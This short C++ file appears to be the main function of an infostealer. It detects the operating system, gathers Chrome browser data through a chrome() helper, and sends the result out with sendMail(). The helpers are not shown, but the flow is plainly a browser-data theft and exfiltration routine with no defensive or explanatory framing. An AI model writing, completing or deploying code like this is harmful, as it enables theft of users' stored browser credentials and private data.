#include "utils.h"
#include "browser_data.h"

int main() {
    const std::string os = osName();

    std::list<std::string> data = chrome(os);
    sendMail(data);
    return 0;
}
